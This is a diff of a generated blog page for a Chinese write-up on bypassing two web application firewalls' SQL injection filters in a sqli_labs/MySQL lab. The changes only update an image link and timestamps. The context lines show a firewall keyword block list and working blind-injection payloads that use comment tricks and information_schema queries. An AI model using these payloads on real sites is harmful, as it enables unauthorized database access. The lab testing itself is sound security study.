@@ -43,11 +43,11 @@ union、select、union select、select from、sleep()
 
 放行语句">
 <meta property="og:image" content="https://i.loli.net/2017/10/13/59e01f47a4d38.jpg">
-<meta property="og:image" content="https://i.loli.net/2017/10/13/59e02adbe8a72.png">
+<meta property="og:image" content="https://i.loli.net/2017/10/13/59e0761ed457a.png">
 <meta property="og:image" content="https://i.loli.net/2017/10/13/59e05ba34408b.png">
 <meta property="og:image" content="https://i.loli.net/2017/10/13/59e05c5773da1.png">
 <meta property="og:image" content="https://i.loli.net/2017/10/13/59e05e4f0c0f2.png">
-<meta property="og:updated_time" content="2017-10-13T07:56:31.000Z">
+<meta property="og:updated_time" content="2017-10-13T08:16:08.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="两款防火墙的注入绕过姿势">
 <meta name="twitter:description" content="前言：两个绕过的测试环境为sqli_labs+mysql。本文主要是以当时测试的思路来写的，还望各位师傅多多指教。
@@ -332,7 +332,7 @@ var _hmt = _hmt || [];
 </ul>
 <h2 id="测试思路"><a href="#测试思路" class="headerlink" title="测试思路"></a>测试思路</h2><ol>
 <li>既然敏感信息会被重置连接，我们可以采用盲注的方式进行绕过<br>先尝试绕过<code>and 1=1/and &#39;a&#39;=&#39;a&#39;</code>的限制，验证是否存在注入<br>在安全狗测试中我们是使用内联注释过狗的，但这款WAF限制了内联注释，所以需要另外的方法。并且由于单引号也被禁止了，暂时未想到绕过方法，先尝试数字型注入的绕过<br>测试payload:<code>and 1 --</code>、<code>and 0 --</code><br><img src="https://i.loli.net/2017/10/13/59e01f47a4d38.jpg" alt=""></li>
-<li>接着我们尝试一下<code>and if</code>形式的注入语句：<br><code>/*/**/and if(substr(1,1,1)=1,1,0) -- -</code><br>未拦截，然后修改payload：<br><code>/*/**/and if(substr(user(),1,1)=&#39;r&#39;,1,0) -- -</code>，成功<br><img src="https://i.loli.net/2017/10/13/59e02adbe8a72.png" alt=""></li>
+<li>接着我们尝试一下<code>and if</code>形式的注入语句：<br><code>/*/**/and if(substr(1,1,1)=1,1,0) -- -</code><br>未拦截，然后修改payload：<br><code>/*/**/and if(substr(user(),1,1)=&#39;r&#39;,1,0) -- -</code>，成功<br><img src="https://i.loli.net/2017/10/13/59e0761ed457a.png" alt=""></li>
 <li>继续往下构造<br><code>/*/*/and if(substr((select/**/schema_name/*/**/from/**/(information_schema.schemata)limit 1 offset 0/*/**/),1,1)=&#39;i&#39;,1,0)-- -</code> 成功<br>select后面跟的/**/是关键<blockquote>
 <p>ps:上面这段payload之前尝试其实是失败的，写文章复现的时候发现居然能过，一脸懵逼。当时是针对select进行了尝试，使用%0aselect进行的绕过</p>
 </blockquote>
@@ -375,7 +375,7 @@ var _hmt = _hmt || [];
         <p><span>本文标题:</span><a href="/2017/10/13/两款WAF的注入绕过姿势/">两款防火墙的注入绕过姿势</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">c0deeast</a></p>
         <p><span>发布时间:</span>2017-10-13, 15:56:18</p>
-        <p><span>最后更新:</span>2017-10-13, 15:56:31</p>
+        <p><span>最后更新:</span>2017-10-13, 16:16:08</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2017/10/13/两款WAF的注入绕过姿势/" title="两款防火墙的注入绕过姿势">http://e4st.world/2017/10/13/两款WAF的注入绕过姿势/</a>
             <span class="copy-path" data-clipboard-text="原文: http://e4st.world/2017/10/13/两款WAF的注入绕过姿势/　　作者: c0deeast" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
